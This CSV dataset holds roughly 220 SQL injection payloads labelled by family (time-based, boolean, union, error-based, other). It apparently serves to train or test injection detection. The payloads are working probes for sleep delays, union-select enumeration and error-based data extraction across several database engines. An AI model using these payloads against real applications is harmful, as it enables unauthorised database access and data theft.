source_line,family,payload
2369,time,1  )   where 2734  =  2734 waitfor delay '0:0:5'--
2370,other,1'||  (  select 'qgnz' where 6446  =  6446
2371,other,1'   )    )    as nhkp where 8030  =  8030
2372,error,"1%""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""%""  =  """
2373,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '"
2374,other,1   )    )    as gygm where 4024  =  4024
2375,boolean,"-2448%""  )   or 3038  =  3038"
2376,boolean,"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr"
2377,other,1'+  (  select ijoh where 7145  =  7145 order by 1--
2378,time,1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --
2379,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf"
2380,other,if  (  1087  =  5839  )   select 1087 else drop function zzeh--
2381,other,-8753  )   order by 1#
2382,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz"
2383,union,"-1485'   )    )     )   union all select 7661,7661,7661,7661,7661--"
2384,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""%""  =  """
2385,boolean,1  )   as jqbp where 5407  =  5407 and 4595  =  4595#
2386,other,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--"
2387,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null#"
2388,other,1'+  (  select wpai where 3685  =  3685
2389,union,-6165%'   )    )    union all select 5384#
2390,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #
2391,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--"
2392,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'frpo' like 'frpo"
2393,time,"1""  )   where 2656  =  2656 or sleep  (  5  )  --"
2394,boolean,-7786'   )    )    or 9323  =  9323#
2395,boolean,"1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"
2396,boolean,-5534 or 1983  =  5721#
2397,other,1'   )    )    as grne where 9003  =  9003 order by 1--
2398,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs"
2399,boolean,"1""   )    )    as hkrh where 3060  =  3060 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --"
2400,boolean,"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'rqyz'  =  'rqyz"
2401,boolean,"-5439"" or 2559  =  4692 and ""dcrf"" like ""dcrf"
2402,other,"1""  )   as kndn where 9314  =  9314"
2403,boolean,-6030%'  )   or 3038  =  3038
2404,other,"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  "
2405,boolean,"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # tqmr"
2406,boolean,1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#
2407,boolean,-1910' or 2624  =  3371 and 'umoy'  =  'umoy
2408,boolean,-7293'   )    )     )   or 3038  =  3038
2409,time,"select sleep  (  5  )   and   (  ""%""  =  """
2410,boolean,"1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"
2411,time,"1'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"
2412,time,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  6786  =  6786"
2413,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3#"
2414,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#"
2415,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #"
2416,time,"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu"
2417,other,1'  )   as twny where 9580  =  9580
2418,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#"
2419,boolean,"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'bvdw'  =  'bvdw"
2420,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  "
2421,union,"-3884"" where 8012  =  8012 union all select 8012,8012#"
2422,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc"
2423,time,select sleep  (  5  )   and    (    (   'srfc' like 'srfc
2424,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993
2425,boolean,"1""  )   where 1666  =  1666 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"
2426,other,"1""   )    )   "
2427,union,"-5572""  )   union all select 8131,8131#"
2428,boolean,"1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
2429,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #
2430,error,-3026  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) 
2431,boolean,"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """
2432,error,1' where 2389  =  2389 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --
2433,union,"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--"
2434,other,-2912'   )    )    order by 1--
2435,other,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3"
2436,union,"1"" union all select null,null,null,null,null#"
2437,other,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--"
2438,time,select sleep  (  5  )  -- hlgt
2439,boolean,"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'sqnk'  =  'sqnk"
2440,boolean,"1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
2441,union,"-4091   )    )    as lqqy where 3030  =  3030 union all select 3030,3030,3030#"
2442,other,"1',  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   "
2443,boolean,1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa
2444,time,"1"" where 9014  =  9014 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --"
2445,other,select case when 8227  =  1229 then 1 else null end--
2446,boolean,-8465' where 5242  =  5242 or 3806  =  7423--
2447,union,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#"
2448,boolean,"1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --"
2449,boolean,1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--
2450,union,"1%' union all select null,null,null,null,null,null,null,null--"
2451,other,1'  )   where 4298  =  4298
2452,boolean,"-5417 or elt  (  1032  =  1032,3623  )  "
2453,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr"
2454,boolean,"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt"
2455,union,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--"
2456,boolean,"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'"
2457,union,"1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--"
2458,boolean,"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
2459,boolean,"1""  )   as jtou where 8129  =  8129 and 7533  =  7533--"
2460,other,1  )   where 6494  =  6494
2461,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj"
2462,union,"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#"
2463,boolean,1%'   )    )     )   and 2006  =  2006
2464,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#"
2465,union,"-3756'  )   union all select 1034,1034,1034--"
2466,time,select sleep  (  5  )   and 'gajm'  =  'gajm
2467,boolean,"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""twpn"" like ""twpn"
2468,boolean,"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye"
2469,other,"1',  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  "
2470,boolean,-3956'  )   or   (  8459  =  8459  )  *4906 and   (  'rflo' like 'rflo
2471,other,"1,iif  (  1440  =  4612,1,1/0  )  "
2472,error,1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'gegg'  =  'gegg
2473,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
2474,error,"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --"
2475,time,"1%'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #"
2476,union,"1 union all select null,null,null,null,null,null#"
2477,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'wvzw'  =  'wvzw"
2478,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  "
2479,other,1'+  (  select 'yjpp' where 8966  =  8966
2480,boolean,"1%""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """
2481,union,"-8266%'  )   union all select 8626,8626,8626,8626,8626,8626--"
2482,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
2483,union,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#"
2484,boolean,"-6359""   )    )    or elt  (  3546  =  2433,2433  )   and    (    (   ""qxat""  =  ""qxat"
2485,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq"
2486,boolean,1   )    )     )   and 6358  =  6735
2487,other,1'   )    )    as cimd where 9608  =  9608
2488,boolean,"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
2489,time,1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +'
2490,union,-9690 union all select 7217#
2491,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz"
2492,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eomt'  =  'eomt"
2493,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce"
2494,time,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk
2495,other,1'  )   where 1212  =  1212
2496,boolean,"1'||  (  select 'ggfx' where 4932  =  4932 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'"
2497,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
2498,boolean,"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
2499,boolean,"-5411%""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """
2500,boolean,"1%' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '"
2501,boolean,"1""  )   as crek where 6570  =  6570 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"
2502,union,"-6084""   )    )    union all select 7354,7354,7354,7354,7354,7354,7354,7354#"
2503,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr"
2504,other,-4191  )   order by 1#
2505,boolean,"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --"
2506,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb"
2507,time,1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --
2508,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq
2509,other,1  )   where 8375  =  8375
2510,boolean,1' in boolean mode  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #
2511,other,1' order by 1--
2512,other,select case when 3920  =  4402 then 1 else null end--
2513,boolean,1'   )    )     )   and 5615  =  5458--
2514,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn"
2515,union,"-5706""   )    )    union all select 2013,2013,2013,2013#"
2516,other,1'  )   where 9159  =  9159
2517,union,"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--"
2518,boolean,"-3546%"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """
2519,other,1'  )   where 2928  =  2928
2520,other,"1""   )    )    as ajwe where 1153  =  1153 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --"
2521,boolean,"1%'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '"
2522,boolean,-9668'   )    )    as orfu where 5822  =  5822 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --
2523,boolean,-2648'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'sawt'  =  'sawt
2524,other,select   (  case when   (  2140  =  5325  )   then 2140 else 2140*  (  select 2140 from information_schema.character_sets  )   end  )  #
2525,other,select   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  select 1123 from information_schema.character_sets  )   end  )  #
2526,union,"-9140""   )    )    union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#"
2527,union,"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--"
2528,boolean,-4669  )   or 2452  =  1601#
2529,boolean,1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  '
2530,time,1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr
2531,union,"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#"
2532,boolean,"-3460%""   )    )     )   or 9323  =  9323#"
2533,other,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --
2534,boolean,"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"
2535,error,-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --
2536,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   "
2537,other,1'+  (  select eluw where 6210  =  6210
2538,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  "
2539,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--"
2540,other,1'   )    )    as egsj where 3447  =  3447
2541,union,"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--"
2542,boolean,-6298' or 4724  =  4876
2543,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy"
2544,boolean,-1802' or 7931  =  5841--
2545,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng"
2546,union,"1 union all select null,null,null,null,null#"
2547,other,"1',  (  select   (  case when   (  1902  =  5536  )   then 1 else 1902*  (  select 1902 from master..sysdatabases  )   end   )    )   "
2548,union,"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#"
2549,union,"1 where 1992  =  1992 union all select null,null--"
2550,boolean,"1"" and 5205  =  9975#"
2551,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  "
2552,other,-4057'  )   order by 1#
2553,union,"-8929%'  )   union all select 9486,9486,9486,9486#"
2554,union,"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--"
2555,boolean,"-2570"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""dmch"" like ""dmch"
2556,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   3127  =  3127"
2557,boolean,-6218'   )    )    or 2236  =  4469#
2558,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft"
2559,union,"-2071 union all select 4753,4753--"
2560,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf"
2561,boolean,"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'aezm' like 'aezm"
2562,boolean,"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"
2563,boolean,"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"
2564,union,"-1076 union all select 3959,3959--"
2565,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo"
2566,union,"1   )    )    union all select null,null,null,null#"
2567,boolean,1'||  (  select 'kuxp' where 7123  =  7123 and 1688  =  4200#
2568,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#"
2569,boolean,"-8043%""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""%""  =  """
2570,boolean,-6122'   )    )     )   or 9243  =  6161--
2571,boolean,"-9725  )   where 9068  =  9068 or elt  (  4723  =  1426,1426  )  --"
2572,boolean,"1%""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
2573,boolean,"1  )   as cejp where 4736  =  4736 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
2574,other,1'+  (  select 'mxlb' where 4900  =  4900
2575,boolean,"1   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  1729  =  1729"
2576,time,"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #"
2577,other,"1"" where 2452  =  2452"
2578,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk"
2579,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'nhmz' like 'nhmz"
2580,error,-4248 where 3288  =  3288 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --
2581,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--"
2582,error,"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'dsok'  =  'dsok"
2583,other,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'"
2584,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #
2585,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #"
2586,boolean,"1'+  (  select llcl where 8188  =  8188 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"
2587,time,1'   )    )     )   and sleep  (  5  )  #
2588,time,"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """
